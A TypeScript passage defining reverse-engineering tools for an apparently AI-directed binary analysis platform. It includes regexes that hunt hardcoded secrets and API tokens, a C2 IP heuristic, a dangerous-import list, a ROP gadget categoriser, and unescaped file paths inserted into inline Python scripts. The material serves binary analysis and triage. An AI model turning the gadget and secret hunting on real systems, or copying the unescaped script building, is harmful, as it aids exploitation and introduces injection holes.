            details: `${f.details ?? ''}${f.function ? `\n\nFunction: ${f.function}` : ''}${f.address ? ` @ ${f.address}` : ''}\n\nMitigation: ${f.mitigation ?? 'Manual review recommended.'}`,
            provenance: 'model' as const,
            toolName: 'llm_binary_review',
            toolOutput: f.details?.slice(0, 200),
          }));

        // For report_synthesis, also capture the narrative before the JSON array
        let summaryText = '';
        if (focus === 'report_synthesis') {
          const jsonIdx = raw.indexOf('[');
          if (jsonIdx > 0) summaryText = raw.slice(0, jsonIdx).trim() + '\n\n';
        }

        return {
          success: true,
          output: `${summaryText}LLM binary review [${focus}] — ${binaryPath}: ${findings.length} finding(s)\n` +
            (findings.length > 0 ? findings.slice(0, 5).map(f => `  [${f.severity.toUpperCase()}] ${f.title}${(f as { function?: string }).function ? ` in ${(f as { function?: string }).function}` : ''}`).join('\n') : '  No issues found.'),
          findings: findings.length > 0 ? findings : undefined,
          additionalEvidence: [{ type: 'command' as const, content: `llm_binary_review(binary="${binaryPath}", focus="${focus}")` }],
        };
      } catch (err) {
        return { success: false, error: `LLM binary review failed: ${err instanceof Error ? err.message : String(err)}` };
      }
    },
  },
  {
    name: 'ghidra_decompile',
    description: 'Decompile a binary function via GhidraMCP (if GHIDRA_MCP_URL is set) or fall back to radare2 disassembly via binary sidecar',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Binary target (local:// reference or plain filename)', required: true },
      { name: 'function_name', type: 'string', description: 'Function to decompile (default: main)', required: false, default: 'main' },
    ],
    handler: async (context) => {
      const rawPath  = String(context.parameters.binary_path   ?? '').trim();
      const funcName = String(context.parameters.function_name ?? 'main').trim() || 'main';

      // Normalise local:// reference to a plain filename for the sidecar
      const fname = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `local://${fname}`;

      // Try GhidraMCP first
      const ghidraUrl = process.env.GHIDRA_MCP_URL;
      if (ghidraUrl) {
        try {
          const resp = await fetch(`${ghidraUrl}/decompile`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ binary: fname, function: funcName }),
            signal: AbortSignal.timeout(60000),
          });
          if (resp.ok) {
            const data = await resp.json() as { decompiled?: string; error?: string };
            if (data.decompiled) {
              return {
                success: true,
                output: `Ghidra decompilation of ${funcName} in ${fname}:\n\n${data.decompiled}`,
                additionalEvidence: [{ type: 'command' as const, content: `ghidra_decompile(binary="${fname}", function="${funcName}") via GhidraMCP` }],
              };
            }
          }
        } catch { /* fall through to radare2 */ }
      }

      // Fallback: radare2 via binary sidecar
      const r2Result = await callSidecar('binary', 'r2', ['-q', '-c', `s ${funcName}; pdf`, filePath as string], {}, 60000);
      if (r2Result.error && r2Result.exitCode !== 0 && !r2Result.stdout) {
        return { success: false, error: r2Result.error ?? `radare2 failed: ${r2Result.stderr}` };
      }

      const output = r2Result.stdout || r2Result.stderr;
      if (!output.trim()) {
        return { success: false, error: `Function "${funcName}" not found in ${fname}. Try running binary recon first to get the function list.` };
      }

      return {
        success: true,
        output: `radare2 disassembly of "${funcName}" in ${fname}${ghidraUrl ? ' (GhidraMCP unavailable, r2 fallback)' : ' (set GHIDRA_MCP_URL for Ghidra decompilation)'}:\n\n${output.slice(0, 8000)}`,
        additionalEvidence: [{ type: 'command' as const, content: `r2 -q -c "s ${funcName}; pdf" ${fname}` }],
      };
    },
  },
  // ===========================================================================
  // BINARY ANALYSIS — LLM-directed tool suite
  // Each tool returns "suggestedNextSteps" so the operator knows what to call next.
  // Typical LLM-directed flow:
  //   binary_recon → binary_strings → binary_functions → ghidra_decompile (×N)
  //   → binary_entropy (if packed) → binary_yara → llm_binary_review
  // ===========================================================================
  {
    name: 'binary_recon',
    description: 'Comprehensive first-pass analysis of a binary/firmware file: format detection, architecture, strings sample, entropy map, and ELF section headers. Returns a structured summary and suggests which tools to run next.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target file — local:// reference (e.g. local://firmware.bin) or plain filename', required: true },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };
      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // Run file, strings sample, readelf/objdump header, binwalk concurrently
      const [fileR, strR, readelfR, binwalkR, exiftoolR] = await Promise.all([
        callSidecar('binary', 'file',     [filePath], {}, 15000),
        callSidecar('binary', 'strings',  ['-n', '8', filePath], {}, 30000),
        callSidecar('binary', 'readelf',  ['-h', filePath], {}, 15000),
        callSidecar('binary', 'binwalk',  ['--entropy', '--quiet', filePath], {}, 60000),
        callSidecar('binary', 'exiftool', [filePath], {}, 15000),
      ]);

      const fileOut    = (fileR.stdout    || '').trim();
      const strOut     = (strR.stdout     || '').trim();
      const readelfOut = (readelfR.stdout || '').trim();
      const binwalkOut = (binwalkR.stdout || '').trim();
      const exifOut    = (exiftoolR.stdout || '').trim();

      const isELF     = fileOut.toLowerCase().includes('elf');
      const isPE      = fileOut.toLowerCase().includes('pe32') || fileOut.toLowerCase().includes('ms-dos');
      const isMachO   = fileOut.toLowerCase().includes('mach-o');
      const isPacked  = binwalkOut.toLowerCase().includes('high entropy') || binwalkOut.toLowerCase().includes('compressed');

      // Truncate strings to top 100 lines
      const strSample = strOut.split('\n').slice(0, 100).join('\n');

      const suggestedNextSteps = [
        '1. Run binary_strings with filter options to extract categorized strings (URLs, IPs, credentials, version strings)',
        isELF || isPE || isMachO ? '2. Run binary_functions to get the full function list — select interesting functions for ghidra_decompile' : '2. Run binary_hexdump at offset 0 to inspect the raw header',
        isPacked ? '3. HIGH ENTROPY DETECTED — run binary_entropy to map packed/encrypted sections before analysis' : '3. Run binary_symbols to enumerate imports, exports, and linked libraries',
        '4. Run llm_binary_review with focus=report_synthesis after gathering analysis data',
      ].join('\n');

      const output = [
        `=== BINARY RECON: ${fname} ===`,
        '',
        `FILE TYPE:\n${fileOut || '(file command failed)'}`,
        '',
        exifOut ? `METADATA (exiftool):\n${exifOut.slice(0, 800)}` : '',
        readelfOut ? `ELF HEADER:\n${readelfOut.slice(0, 600)}` : '',
        '',
        `STRINGS SAMPLE (first 100):\n${strSample || '(no printable strings)'}`,
        '',
        binwalkOut ? `ENTROPY/BINWALK:\n${binwalkOut.slice(0, 600)}` : '',
        '',
        `SUGGESTED NEXT STEPS:\n${suggestedNextSteps}`,
      ].filter(Boolean).join('\n');

      return {
        success: true,
        output,
        // Store as vault finding so subsequent phases can retrieve the analysis
        findings: [{
          title: `Binary recon: ${fname}`,
          severity: 'info' as const,
          details: output.slice(0, 3000),
          provenance: 'tool' as const,
          toolName: 'binary_recon',
          toolOutput: `file=${fileOut.slice(0,120)} | entropy=${isPacked ? 'HIGH (packed)' : 'normal'}`,
        }],
        additionalEvidence: [
          { type: 'command' as const, content: `file "${filePath}"` },
          { type: 'command' as const, content: `strings -n 8 "${filePath}" | head -100` },
        ],
      };
    },
  },
  {
    name: 'binary_strings',
    description: 'Extract and categorize printable strings from a binary. Automatically classifies URLs, IPs, email addresses, file paths, crypto constants, version strings, and potential hardcoded credentials. Ideal for quick intel gathering.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target file — local:// reference or plain filename', required: true },
      { name: 'min_length',  type: 'number', description: 'Minimum string length (default 8)', required: false, default: 8 },
      { name: 'filter',      type: 'string', description: 'Optional grep-style filter pattern (case-insensitive)', required: false },
    ],
    handler: async (context) => {
      const rawPath   = String(context.parameters.binary_path ?? '').trim();
      const minLen    = Math.max(4, Number(context.parameters.min_length ?? 8));
      const filter    = String(context.parameters.filter ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const result = await callSidecar('binary', 'strings', ['-n', String(minLen), filePath], {}, 60000);
      if (result.exitCode !== 0 && !result.stdout) {
        return { success: false, error: result.error ?? `strings failed: ${result.stderr}` };
      }

      let lines = (result.stdout || '').split('\n').filter(l => l.trim());
      if (filter) {
        const re = new RegExp(filter, 'i');
        lines = lines.filter(l => re.test(l));
      }

      // Categorize
      const categories: Record<string, string[]> = {
        urls:         lines.filter(l => /https?:\/\/|ftp:\/\//.test(l)),
        ips:          lines.filter(l => /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(l)),
        emails:       lines.filter(l => /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(l)),
        paths:        lines.filter(l => /^\/[a-zA-Z0-9_./~-]{3,}$|^[A-Z]:\\/.test(l)),
        credentials:  lines.filter(l =>
          /password|passwd|secret|token|api[-_]?key|bearer|auth/i.test(l) ||
          /AKIA[A-Z0-9]{16}/i.test(l) ||
          /-----BEGIN\s+(RSA\s+)?(PUBLIC|PRIVATE|EC)\s+KEY/.test(l) ||
          /(?:mysql|postgres|postgresql|mongodb|redis):\/\/[^"'\s]{8,}/.test(l) ||
          /(?:sk-ant-|sk-[A-Za-z0-9]{20,}|ghp_|ghs_|github_pat_|xoxb-|xoxp-)/.test(l)
        ),
        version:      lines.filter(l => /v?\d+\.\d+\.\d+|version\s+\d/i.test(l)),
        crypto:       lines.filter(l => /AES|RSA|SHA[-_]?\d+|MD5|ECDSA|hmac|pbkdf/i.test(l)),
        c2:           lines.filter(l =>
          /\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/.test(l) &&
          !/127\.0\.0\.1|0\.0\.0\.0|255\.255\./.test(l)
        ),
      };

      // Build distinct findings per category
      const findings: Array<{ title: string; severity: 'critical' | 'high' | 'medium' | 'low' | 'info'; details: string; provenance: 'tool'; toolName: string; toolOutput?: string }> = [];
      if (categories.credentials.length > 0) {
        findings.push({
          title: 'Hardcoded credentials / secrets in binary',
          severity: 'high' as const,
          details: `Found ${categories.credentials.length} string(s) matching credential or secret patterns:\n${categories.credentials.slice(0, 8).join('\n')}`,
          provenance: 'tool' as const,
          toolName: 'binary_strings',
          toolOutput: categories.credentials.slice(0, 3).join(', '),
        });
      }
      if (categories.c2.length > 0) {
        findings.push({
          title: 'Hardcoded routable IP addresses (potential C2)',
          severity: 'high' as const,
          details: `Found ${categories.c2.length} non-loopback IP address(es) embedded in binary:\n${categories.c2.slice(0, 6).join('\n')}`,
          provenance: 'tool' as const,
          toolName: 'binary_strings',
          toolOutput: categories.c2.slice(0, 3).join(', '),
        });
      }

      const summary = Object.entries(categories)
        .filter(([, v]) => v.length > 0)
        .map(([k, v]) => `${k.toUpperCase()} (${v.length}):\n  ${v.slice(0, 10).join('\n  ')}${v.length > 10 ? `\n  ... (${v.length - 10} more)` : ''}`)
        .join('\n\n');

      const suggestedNextSteps = [
        categories.credentials.length > 0 ? '⚠ HARDCODED CREDENTIALS/KEYS — run llm_binary_review(binary_path, focus="crypto_weakness") for full analysis' : '',
        categories.c2.length > 0          ? '⚠ ROUTABLE IPs FOUND — run llm_binary_review(binary_path, focus="backdoor_indicators")' : '',
        categories.urls.length > 0        ? 'URLs found — investigate external C2/update servers with dns_lookup or http_request' : '',
        'Run llm_binary_review(binary_path, focus="memory_corruption") to find buffer overflows, UAF, integer overflows',
        'Run binary_functions to enumerate entry points and call graph for deeper analysis',
      ].filter(Boolean).join('\n');

      return {
        success: true,
        output: `=== STRINGS ANALYSIS: ${fname} (min-len=${minLen}${filter ? `, filter="${filter}"` : ''}) ===\nTotal strings: ${lines.length}\n\n${summary || '(no categorized strings found)'}\n\nSUGGESTED NEXT STEPS:\n${suggestedNextSteps || 'Continue with binary_functions to enumerate code entry points.'}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `strings -n ${minLen} "${filePath}"${filter ? ` | grep -i "${filter}"` : ''}` }],
      };
    },
  },
  {
    name: 'binary_functions',
    description: 'List all functions discovered in a binary via radare2 analysis (aaa + afl). Returns function names, addresses, sizes, and call counts. Use the output to select specific functions for ghidra_decompile.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target file — local:// reference or plain filename', required: true },
      { name: 'sort_by',     type: 'string', description: 'Sort order: size (largest first), calls (most-called), name, or address (default)', required: false, default: 'size' },
      { name: 'limit',       type: 'number', description: 'Max functions to return (default 50)', required: false, default: 50 },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      const sortBy  = String(context.parameters.sort_by    ?? 'size').trim();
      const limit   = Math.max(1, Math.min(200, Number(context.parameters.limit ?? 50)));
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // radare2: auto-analyze then list functions in JSON format
      const r2Cmd = 'r2';
      const r2Args = ['-q', '-c', 'aaa; aflj', filePath];
      const result = await callSidecar('binary', r2Cmd, r2Args, {}, 120000);

      if (result.error && !result.stdout) {
        return { success: false, error: result.error ?? `radare2 failed: ${result.stderr}` };
      }

      // Parse JSON function list from r2
      let funcs: Array<{ name: string; offset: number; size: number; nbbs?: number; cc?: number }> = [];
      try {
        const jsonMatch = (result.stdout || '').match(/\[[\s\S]*\]/);
        if (jsonMatch) funcs = JSON.parse(jsonMatch[0]);
      } catch {
        // Fall back to text afl output if JSON fails
        const lines = (result.stdout || '').split('\n').filter(l => /^0x[0-9a-f]+/.test(l.trim()));
        funcs = lines.map(l => {
          const parts = l.trim().split(/\s+/);
          return { name: parts[parts.length - 1] ?? 'unknown', offset: parseInt(parts[0], 16) || 0, size: parseInt(parts[2] ?? '0') || 0 };
        });
      }

      // Sort
      if (sortBy === 'size')  funcs.sort((a, b) => (b.size  ?? 0) - (a.size  ?? 0));
      if (sortBy === 'calls') funcs.sort((a, b) => (b.cc    ?? 0) - (a.cc    ?? 0));
      if (sortBy === 'name')  funcs.sort((a, b) => a.name.localeCompare(b.name));

      const top = funcs.slice(0, limit);
      const table = top.map((f, i) =>
        `${String(i + 1).padStart(3)}. ${f.name.padEnd(40)} @ 0x${f.offset.toString(16).padStart(8, '0')}  size=${f.size}B`
      ).join('\n');

      const suggestedNextSteps = [
        `Use ghidra_decompile to inspect suspicious functions. High-value targets:`,
        ...top.slice(0, 5).filter(f => !/^sym\.imp\.|^loc\.|^fcn\.00/.test(f.name))
          .map(f => `  ghidra_decompile(binary_path="${rawPath}", function_name="${f.name}")`),
        'Look for: sub_* / fcn_* functions (compiler-stripped), crypto-named functions, functions with high cyclomatic complexity (cc)',
      ].join('\n');

      const funcOutput = `=== FUNCTION LIST: ${fname} — ${funcs.length} functions total, showing top ${top.length} by ${sortBy} ===\n\n${table}\n\nSUGGESTED NEXT STEPS:\n${suggestedNextSteps}`;
      return {
        success: true,
        output: funcOutput,
        findings: funcs.length > 0 ? [{
          title: `Function inventory: ${fname} (${funcs.length} functions)`,
          severity: 'info' as const,
          details: funcOutput.slice(0, 3000),
          provenance: 'tool' as const,
          toolName: 'binary_functions',
          toolOutput: `${funcs.length} functions; top by size: ${top.slice(0,3).map(f=>f.name).join(', ')}`,
        }] : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `r2 -q -c "aaa; aflj" "${filePath}"` }],
      };
    },
  },
  {
    name: 'binary_symbols',
    description: 'Enumerate imports, exports, dynamic libraries, and symbol table entries via nm and readelf. Reveals what external functions the binary calls, what it exports, and which shared libraries are linked.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target file — local:// reference or plain filename', required: true },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const [nmR, dynR, secR] = await Promise.all([
        callSidecar('binary', 'nm',      ['-D', '--demangle', filePath], {}, 30000),
        callSidecar('binary', 'readelf', ['-d', filePath],               {}, 15000),
        callSidecar('binary', 'readelf', ['-S', '--wide', filePath],     {}, 15000),
      ]);

      const nmOut   = (nmR.stdout   || nmR.stderr   || '').trim();
      const dynOut  = (dynR.stdout  || dynR.stderr  || '').trim();
      const secOut  = (secR.stdout  || secR.stderr  || '').trim();

      // Extract linked libraries from dynamic section
      const libs = (dynOut.match(/\(NEEDED\)\s+Shared library: \[([^\]]+)\]/g) ?? [])
        .map(l => l.match(/\[([^\]]+)\]/)?.[1] ?? '');

      // Look for interesting imported symbols (memory/crypto/net/exec)
      const dangerousImports = (nmOut.split('\n'))
        .filter(l => l.includes('U ')) // undefined = imported
        .map(l => l.trim().split(/\s+/).pop() ?? '')
        .filter(sym => /strcpy|strcat|sprintf|gets|scanf|system|popen|exec[vl]|mmap|dlopen|connect|recv|send|ptrace|setuid/i.test(sym));

      const findings = dangerousImports.length > 0 ? [{
        title: 'Dangerous imported functions detected',
        severity: 'high' as const,
        details: `Functions with known exploitation history:\n${dangerousImports.slice(0, 20).join('\n')}\n\nThese may indicate buffer overflow, command injection, or privilege escalation vectors.`,
        provenance: 'tool' as const,
        toolName: 'binary_symbols',
        toolOutput: dangerousImports.slice(0, 5).join(', '),
      }] : undefined;

      const suggestedNextSteps = [
        dangerousImports.length > 0 ? `⚠ ${dangerousImports.length} dangerous imports found — run llm_binary_review with focus=memory_corruption` : '',
        libs.length > 0 ? `Linked libs: ${libs.join(', ')} — check for known-vulnerable versions via cve_lookup` : '',
        'Run binary_functions to find callers of the dangerous imports, then ghidra_decompile those callers',
      ].filter(Boolean).join('\n');

      return {
        success: true,
        output: [
          `=== SYMBOL TABLE: ${fname} ===`,
          '',
          libs.length > 0 ? `LINKED LIBRARIES (${libs.length}):\n  ${libs.join('\n  ')}` : '',
          '',
          dangerousImports.length > 0 ? `DANGEROUS IMPORTS (${dangerousImports.length}):\n  ${dangerousImports.join('\n  ')}` : 'No dangerous imports detected.',
          '',
          dynOut ? `DYNAMIC SECTION:\n${dynOut.slice(0, 800)}` : '',
          secOut ? `\nSECTION HEADERS (summary):\n${secOut.slice(0, 600)}` : '',
          nmOut  ? `\nSYMBOL TABLE (first 60 lines):\n${nmOut.split('\n').slice(0, 60).join('\n')}` : '',
          '',
          `SUGGESTED NEXT STEPS:\n${suggestedNextSteps || 'Continue with binary_functions for call-graph analysis.'}`,
        ].filter(Boolean).join('\n'),
        findings,
        additionalEvidence: [
          { type: 'command' as const, content: `nm -D --demangle "${filePath}"` },
          { type: 'command' as const, content: `readelf -d "${filePath}"` },
        ],
      };
    },
  },
  {
    name: 'binary_entropy',
    description: 'Generate a full entropy map of a binary using binwalk. High-entropy regions indicate packed, encrypted, or compressed sections. Use to identify obfuscated code, embedded payloads, and encrypted config.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target file — local:// reference or plain filename', required: true },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // binwalk signature scan + entropy analysis
      const [sigR, entR] = await Promise.all([
        callSidecar('binary', 'binwalk', [filePath],            {}, 60000),
        callSidecar('binary', 'binwalk', ['--entropy', '--quiet', filePath], {}, 60000),
      ]);

      const sigOut = (sigR.stdout || sigR.stderr || '').trim();
      const entOut = (entR.stdout || entR.stderr || '').trim();

      const highEntropyLines = entOut.split('\n')
        .filter(l => {
          const match = l.match(/[\d.]+/g);
          return match && parseFloat(match[match.length - 1] ?? '0') > 0.95;
        });

      const embeddedSignatures = sigOut.split('\n')
        .filter(l => /filesystem|executable|archive|certificate|key|encrypted|compressed/i.test(l));

      const findings = (highEntropyLines.length > 3 || embeddedSignatures.length > 0) ? [{
        title: 'Packed or obfuscated content detected',
        severity: 'medium' as const,
        details: [
          highEntropyLines.length > 3 ? `${highEntropyLines.length} high-entropy regions (>0.95) suggest packing/encryption` : '',
          embeddedSignatures.length > 0 ? `Embedded signatures: ${embeddedSignatures.slice(0, 3).join('; ')}` : '',
        ].filter(Boolean).join('\n'),
        provenance: 'tool' as const,
        toolName: 'binary_entropy',
        toolOutput: `${highEntropyLines.length} high-entropy regions`,
      }] : undefined;

      const suggestedNextSteps = [
        embeddedSignatures.length > 0 ? `⚠ Embedded components found — try binwalk -e (extraction) or binary_hexdump at the offsets above` : '',
        highEntropyLines.length > 3 ? 'High entropy: binary may be packed. Look for unpacking stubs via binary_functions before decompilation' : '',
        'Run llm_binary_review with focus=backdoor_indicators to interpret entropy findings',
      ].filter(Boolean).join('\n');

      return {
        success: true,
        output: [
          `=== ENTROPY ANALYSIS: ${fname} ===`,
          '',
          sigOut ? `SIGNATURES / EMBEDDED FILES:\n${sigOut.slice(0, 1500)}` : '(no binwalk signatures)',
          '',
          entOut ? `ENTROPY MAP:\n${entOut.slice(0, 1500)}` : '(entropy scan failed)',
          highEntropyLines.length > 0 ? `\nHIGH-ENTROPY REGIONS (${highEntropyLines.length}):\n  ${highEntropyLines.slice(0, 10).join('\n  ')}` : '',
          '',
          `SUGGESTED NEXT STEPS:\n${suggestedNextSteps || 'Entropy profile looks normal. Proceed with binary_functions analysis.'}`,
        ].filter(Boolean).join('\n'),
        findings,
        additionalEvidence: [{ type: 'command' as const, content: `binwalk --entropy --quiet "${filePath}"` }],
      };
    },
  },
  {
    name: 'binary_hexdump',
    description: 'Hex dump a specific region of a binary (via xxd). Use to inspect raw bytes at a known offset — e.g., after binary_entropy identifies a suspicious region, or to read an embedded string/config blob.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target file — local:// reference or plain filename', required: true },
      { name: 'offset',      type: 'number', description: 'Start offset in bytes (default 0)', required: false, default: 0 },
      { name: 'length',      type: 'number', description: 'Number of bytes to dump (default 256, max 4096)', required: false, default: 256 },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      const offset  = Math.max(0, Number(context.parameters.offset ?? 0));
      const length  = Math.max(16, Math.min(4096, Number(context.parameters.length ?? 256)));
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // xxd -s <offset> -l <length>
      const result = await callSidecar('binary', 'xxd', ['-s', String(offset), '-l', String(length), filePath], {}, 30000);
      if (result.exitCode !== 0 && !result.stdout) {
        return { success: false, error: result.error ?? `xxd failed: ${result.stderr}` };
      }

      const suggestedNextSteps = [
        'If you see a repeating pattern, this region may be XOR-encrypted with a short key',
        'If bytes are mostly printable ASCII, run binary_strings with a filter on the nearby offset range',
        'If you see an ELF/PE magic at an embedded offset, this may be a dropper — use binary_entropy for signature scan',
        'To see more, re-run with a larger length or incremented offset',
      ].join('\n');

      return {
        success: true,
        output: `=== HEX DUMP: ${fname} @ offset 0x${offset.toString(16)} (${length} bytes) ===\n\n${result.stdout || '(empty)'}\n\nSUGGESTED NEXT STEPS:\n${suggestedNextSteps}`,
        additionalEvidence: [{ type: 'command' as const, content: `xxd -s ${offset} -l ${length} "${filePath}"` }],
      };
    },
  },
  {
    name: 'binary_yara',
    description: 'Scan a binary with YARA rules. Uses built-in rulesets for malware families, crypto constants, packers, and shellcode if no inline rules are provided. Ideal for quick triage and known-bad pattern matching.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path',  type: 'string', description: 'Target file — local:// reference or plain filename', required: true },
      { name: 'rules_source', type: 'string', description: 'Inline YARA rule(s) text, or "builtin" to use the sidecar\'s bundled rulesets (default: builtin)', required: false, default: 'builtin' },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path  ?? '').trim();
      const rulesIn = String(context.parameters.rules_source ?? 'builtin').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      let result;
      if (rulesIn === 'builtin' || !rulesIn) {
        // Use bundled rulesets from common locations inside the binary sidecar
        const candidatePaths = ['/opt/yara-rules', '/usr/share/yara-rules', '/etc/yara'];
        // Try each ruleset directory in the sidecar; send a small script via python3
        const scanScript = `
import subprocess, os, sys
dirs = ${JSON.stringify(candidatePaths)}
target = "${filePath}"
all_matches = []
for d in dirs:
    if not os.path.exists(d):
        continue
    for root, _, files in os.walk(d):
        for f in files:
            if f.endswith('.yar') or f.endswith('.yara'):
                rpath = os.path.join(root, f)
                try:
                    r = subprocess.run(['yara', '-r', rpath, target], capture_output=True, text=True, timeout=15)
                    if r.stdout.strip():
                        all_matches.append(r.stdout.strip())
                except Exception as e:
                    pass
if all_matches:
    print("\\n".join(all_matches))
else:
    # Fallback: yara with no rules — just try basic strings match
    r = subprocess.run(['yara', '--help'], capture_output=True, text=True)
    print("No bundled rulesets found at standard paths. yara is available but needs rules. Provide rules_source with inline YARA text.")
`;
        result = await callSidecar('binary', 'python3', ['-c', scanScript], {}, 60000);
      } else {
        // Write inline rules to a temp file via python3
        const escapedRules = rulesIn.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n');
        const inlineScript = `
import subprocess, tempfile, os
rules = '${escapedRules}'
with tempfile.NamedTemporaryFile(mode='w', suffix='.yar', delete=False) as f:
    f.write(rules)
    rpath = f.name
try:
    r = subprocess.run(['yara', rpath, '${filePath}'], capture_output=True, text=True, timeout=30)
    print(r.stdout or r.stderr or 'No matches')
finally:
    os.unlink(rpath)
`;
        result = await callSidecar('binary', 'python3', ['-c', inlineScript], {}, 45000);
      }

      const out = (result.stdout || result.stderr || '').trim();
      const matchCount = out.split('\n').filter(l => l.trim() && !l.startsWith('No ') && !l.startsWith('yara')).length;

      const findings = matchCount > 0 ? [{
        title: `YARA: ${matchCount} rule match(es) in binary`,
        severity: 'high' as const,
        details: out.slice(0, 500),
        provenance: 'tool' as const,
        toolName: 'binary_yara',
        toolOutput: out.slice(0, 200),
      }] : undefined;

      const suggestedNextSteps = matchCount > 0
        ? 'YARA matches found — run llm_binary_review with focus=backdoor_indicators to interpret findings. Cross-reference match names against threat intelligence.'
        : 'No YARA matches. Consider running llm_binary_review with focus=report_synthesis for a full LLM-driven analysis.';

      return {
        success: true,
        output: `=== YARA SCAN: ${fname} ===\n\n${out || '(no output)'}\n\nMatches: ${matchCount}\n\nSUGGESTED NEXT STEPS:\n${suggestedNextSteps}`,
        findings,
        additionalEvidence: [{ type: 'command' as const, content: `yara /opt/yara-rules/ "${filePath}"` }],
      };
    },
  },
  {
    name: 'binary_rop_gadgets',
    description: 'Find ROP (Return-Oriented Programming) gadgets in a binary using ROPgadget. Reports pop/ret chains, syscall gadgets, stack pivots, and ret2libc/ret2plt building blocks. Essential for assessing exploitability of memory corruption findings.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target binary — local:// reference or plain filename', required: true },
      { name: 'focus', type: 'string', description: 'Gadget focus: rop (all gadgets) | sys (syscall gadgets) | pivot (stack pivot gadgets) | ret2libc (argument-setup gadgets). Default: rop', required: false, default: 'rop' },
    ],
    handler: async (context) => {
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      const focus   = String(context.parameters.focus        ?? 'rop').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // Build ROPgadget args
      const ropArgs = ['--binary', filePath, '--rop'];
      if (focus === 'sys')    ropArgs.push('--sys');
      if (focus === 'jop')    ropArgs.push('--jop');
      if (focus === 'pivot')  ropArgs.push('--filter', 'rsp');
      if (focus === 'ret2libc') ropArgs.push('--filter', 'pop');

      const result = await callSidecar('binary', 'ROPgadget', ropArgs, {}, 120000);
      if (result.error && !result.stdout) {
        return { success: false, error: result.error ?? 'ROPgadget failed' };
      }

      const lines = (result.stdout || '').split('\n').filter(l => l.trim());

      // Categorize high-value gadgets
      const syscallGadgets = lines.filter(l => /syscall|int 0x80|sysenter/i.test(l));
      const popRdiGadgets  = lines.filter(l => /pop rdi\s*;?\s*ret/i.test(l));   // first arg for x86_64 calling conv
      const popRsiGadgets  = lines.filter(l => /pop rsi\s*;?\s*ret/i.test(l));   // second arg
      const popRspGadgets  = lines.filter(l => /pop rsp|push rsp/i.test(l));     // stack pivot
      const retGadgets     = lines.filter(l => /^.*:\s*ret\s*$/.test(l));        // lone ret (stack alignment)
      const callGadgets    = lines.filter(l => /call\s+r(ax|bx|cx|dx|bp|sp|si|di|8|9|10|11|12|13|14|15)/i.test(l));
      const jmpGadgets     = lines.filter(l => /jmp\s+r(ax|bx|cx|dx|bp|sp|si|di|8|9|10|11|12|13|14|15)/i.test(l));
      const writableGadgets = lines.filter(l => /mov \[r|mov dword ptr \[/i.test(l));

      const totalCount = lines.filter(l => /^0x[0-9a-f]+/.test(l)).length;

      const summary = [
        `Total gadgets: ${totalCount}`,
        syscallGadgets.length  ? `\nSYSCALL gadgets (${syscallGadgets.length}):\n  ${syscallGadgets.slice(0, 5).join('\n  ')}` : '',
        popRdiGadgets.length   ? `\npop rdi ; ret gadgets — x86_64 first-arg setup (${popRdiGadgets.length}):\n  ${popRdiGadgets.slice(0, 5).join('\n  ')}` : '',
